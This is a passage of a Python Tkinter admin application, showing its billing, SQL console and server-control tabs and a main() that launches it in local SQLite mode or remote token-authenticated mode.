        self.selected_event_id = int(sel[0]) if sel else None

    def _reverse(self):
        if not self.selected_event_id:
            messagebox.showinfo("Billing", "Select a billing event first.")
            return
        reason = simpledialog.askstring(
            "Reverse billing event", "Reason for reversal (required):", parent=self
        )
        if not reason or not reason.strip():
            return
        event_id = self.selected_event_id

        def work():
            return self.app.call_action("billing.reverse_event", event_id=event_id, reason=reason)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Billing", str(result))
            else:
                messagebox.showinfo("Billing", "Reversal recorded.")
                self._refresh()

        self.app.run_async(work, apply)

    def _export_csv(self):
        account_id = self._current_account_id()
        if not account_id:
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".csv", initialfile=f"billing-account-{account_id}.csv"
        )
        if not path:
            return

        def work():
            events = self.app.call("billing_summary", account_id=account_id)["events"]
            with open(path, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(self.COLUMNS)
                for row in events:
                    writer.writerow([_csv_safe_cell(row[c]) for c in self.COLUMNS])
            return len(events)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Billing", str(result))
            else:
                messagebox.showinfo("Billing", f"Wrote {result} rows to {path}")

        self.app.run_async(work, apply)

    def _generate_report(self):
        account_id = self._current_account_id()
        if not account_id:
            messagebox.showinfo("Savings report", "Select an account first.")
            return

        def build_default_name():
            account = self.app.call("account_detail", account_id=account_id)["account"]
            return reports.default_report_filename(account)

        path = filedialog.asksaveasfilename(
            defaultextension=".html", initialfile=build_default_name()
        )
        if not path:
            return

        def work():
            # Rendering happens server side (it needs conn); the HTML then
            # crosses the wire to be written at the local path the operator
            # just picked -- see admin_api.op_savings_report_html.
            html = self.app.call("savings_report_html", account_id=account_id)["html"]
            dest_path = Path(path)
            dest_path.parent.mkdir(parents=True, exist_ok=True)
            dest_path.write_text(html, encoding="utf-8")
            return dest_path

        def apply(result):
            if is_error(result):
                messagebox.showerror("Savings report", str(result))
                return
            if messagebox.askyesno("Savings report", f"Report saved to {result}.\n\nOpen it now?"):
                webbrowser.open(result.as_uri())

        self.app.run_async(work, apply)

    def _generate_all_reports(self):
        dest_dir = filedialog.askdirectory(title="Choose a folder for one report per account")
        if not dest_dir:
            return

        def work():
            reports_data = self.app.call("savings_reports_all_html")["reports"]
            written = []
            for r in reports_data:
                dest_path = Path(dest_dir) / r["filename"]
                dest_path.parent.mkdir(parents=True, exist_ok=True)
                dest_path.write_text(r["html"], encoding="utf-8")
                written.append(dest_path)
            return written

        def apply(result):
            if is_error(result):
                messagebox.showerror("Savings reports", str(result))
                return
            if messagebox.askyesno(
                "Savings reports",
                f"Wrote {len(result)} report(s) to {dest_dir}.\n\nOpen the folder now?",
            ):
                webbrowser.open(Path(dest_dir).as_uri())

        self.app.run_async(work, apply)


# ---------------------------------------------------------------------------
# Tab 8: SQL console
# ---------------------------------------------------------------------------


class SqlConsoleTab(ttk.Frame):
    def __init__(self, parent, app: AdminApp):
        super().__init__(parent)
        self.app = app
        self._build()

    def _build(self):
        top = ttk.Frame(self, padding=6)
        top.pack(fill="x")
        self.unsafe_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(
            top,
            text="Unsafe mode (allow writes -- every statement is logged to audit_log)",
            variable=self.unsafe_var,
        ).pack(side="left")
        ttk.Button(top, text="Run (Ctrl+Enter)", command=self._run).pack(side="right")

        self.sql_text = scrolledtext.ScrolledText(self, height=8, font=("TkFixedFont", 11))
        self.sql_text.pack(fill="x", padx=6)
        self.sql_text.bind("<Control-Return>", lambda e: self._run())

        self.result_tree = ttk.Treeview(self, show="headings")
        self.result_tree.pack(fill="both", expand=True, padx=6, pady=6)

        self.status_label = ttk.Label(self, text="Read-only mode.")
        self.status_label.pack(fill="x", padx=6, pady=(0, 6))

    def _run(self):
        sql = self.sql_text.get("1.0", "end").strip()
        if not sql:
            return
        unsafe = self.unsafe_var.get()
        stripped = sql.strip().lower()
        # First gate: a cheap, friendly rejection for the obvious case.
        # Not a security boundary on its own -- db.set_read_only() below
        # is what actually enforces read-only, since a CTE can prefix a
        # DELETE and still start with "with".
        if not unsafe and not stripped.startswith(READ_ONLY_PREFIXES):
            messagebox.showerror(
                "SQL console",
                "Only SELECT/PRAGMA/EXPLAIN/WITH are allowed in read-only mode. Enable unsafe mode for writes.",
            )
            return

        def work():
            # Multi-statement handling, the read-only/unsafe split, and the
            # audit-before-execute call for unsafe mode all live in
            # admin_api.run_sql now -- shared between local and remote so
            # there's one implementation of "what does the SQL console
            # actually do", not two that can drift.
            return self.app.call_sql(sql, unsafe)

        def apply(result):
            for item in self.result_tree.get_children():
                self.result_tree.delete(item)
            if is_error(result):
                self.status_label.configure(text=f"Error: {result}")
                self.result_tree.configure(columns=())
                return
            if "columns" in result:
                self.result_tree.configure(columns=result["columns"])
                for c in result["columns"]:
                    self.result_tree.heading(c, text=c)
                    self.result_tree.column(c, width=120)
                for row in result["rows"]:
                    self.result_tree.insert("", "end", values=list(row))
                self.status_label.configure(text=f"{len(result['rows'])} row(s).")
            elif result.get("multi_statement"):
                self.result_tree.configure(columns=())
                self.status_label.configure(
                    text="OK. Multiple statements executed (no result set to show)."
                )
            else:
                self.status_label.configure(text=f"OK. {result['rowcount']} row(s) affected.")

        self.app.run_async(work, apply)


# ---------------------------------------------------------------------------
# Tab 9: Server control
# ---------------------------------------------------------------------------


class ServerControlTab(ttk.Frame):
    def __init__(self, parent, app: AdminApp):
        super().__init__(parent)
        self.app = app
        self._build()

    def _build(self):
        top = ttk.Frame(self, padding=6)
        top.pack(fill="x")
        # subprocess.Popen(serve.py) starts a *local* dev server -- there's
        # nothing for it to control against a remote deployment (its own
        # uwsgi process is managed by the host, e.g. PythonAnywhere's Web
        # tab, not by anything this GUI can reach). Base URL editing below
        # still applies in both modes: it's just where QR/impersonation
        # links point.
        remote = bool(self.app.remote_url)
        start_btn = ttk.Button(top, text="Start server", command=self._start)
        start_btn.pack(side="left")
        stop_btn = ttk.Button(top, text="Stop server", command=self._stop)
        stop_btn.pack(side="left", padx=6)
        if remote:
            start_btn.configure(state="disabled")
            stop_btn.configure(state="disabled")
        self.status_label = ttk.Label(top, text="N/A (remote mode)" if remote else "Stopped")
        self.status_label.pack(side="left", padx=10)

        url_frame = ttk.Frame(self, padding=6)
        url_frame.pack(fill="x")
        ttk.Label(url_frame, text="Base URL (used for impersonation links / QR codes):").pack(
            side="left"
        )
        self.base_url_var = tk.StringVar(value=self.app.base_url)
        entry = ttk.Entry(url_frame, textvariable=self.base_url_var, width=40)
        entry.pack(side="left", padx=6)
        entry.bind("<FocusOut>", lambda e: self._save_base_url())

        self.qr_label = ttk.Label(self, text="")
        self.qr_label.pack(pady=6)

        self.log_text = scrolledtext.ScrolledText(
            self, height=20, font=("TkFixedFont", 9), background="#14171a", foreground="#e0e0e0"
        )
        self.log_text.pack(fill="both", expand=True, padx=6, pady=6)

    def _save_base_url(self):
        self.app.base_url = self.base_url_var.get()

    def _start(self):
        if self.app.remote_url:
            return  # button is disabled in remote mode; belt and suspenders
        if self.app.server_process and self.app.server_process.poll() is None:
            messagebox.showinfo("Server", "Already running.")
            return
        self._save_base_url()
        cmd = [sys.executable, str(BASE_DIR / "serve.py"), "--db", str(self.app.db_path)]
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
        except Exception as e:
            messagebox.showerror("Server", str(e))
            return
        self.app.server_process = proc
        self.status_label.configure(text=f"Running (pid {proc.pid})")

        def tail():
            assert proc.stdout is not None  # opened with stdout=PIPE
            for line in proc.stdout:
                self.app.runner.q.put((self._append_log, line))
            self.app.runner.q.put((self._append_log, "[server process exited]\n"))

        threading.Thread(target=tail, daemon=True).start()

    def _append_log(self, line):
        self.log_text.insert("end", line)
        self.log_text.see("end")

    def _stop(self):
        if self.app.server_process and self.app.server_process.poll() is None:
            self.app.server_process.terminate()
            self.status_label.configure(text="Stopped")
        else:
            messagebox.showinfo("Server", "Not running.")


def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--db", type=str, default=None, help="Local mode: path to the SQLite database."
    )
    parser.add_argument(
        "--remote-url",
        type=str,
        default=None,
        help="Remote mode: base URL of a hosted deployment, e.g. https://you.pythonanywhere.com",
    )
    parser.add_argument(
        "--token",
        type=str,
        default=None,
        help="Remote mode: the admin API bearer token (see admin_api_token.py --show).",
    )
    parser.add_argument(
        "--token-file",
        type=str,
        default=None,
        help="Remote mode: read the bearer token from this file instead of the command line (keeps it out of shell history).",
    )
    args = parser.parse_args()

    if args.remote_url:
        token = args.token
        if not token and args.token_file:
            token = Path(args.token_file).expanduser().read_text().strip()
        if not token:
            parser.error("--remote-url requires --token or --token-file")
        try:
            app = AdminApp(remote_url=args.remote_url, token=token)
        except ValueError as exc:
            # _validate_remote_url rejects a non-HTTP(S) URL. Omitting the
            # scheme entirely -- `--remote-url you.example.com` -- is the
            # common typo, and argparse's own error format is what someone
            # running a CLI expects to see, not a traceback.
            parser.error(str(exc))
    else:
        db_path = Path(args.db) if args.db else db.DEFAULT_DB_PATH
        db.init_db(db_path).close()
        app = AdminApp(db_path=db_path)
    app.mainloop()


if __name__ == "__main__":
    main()
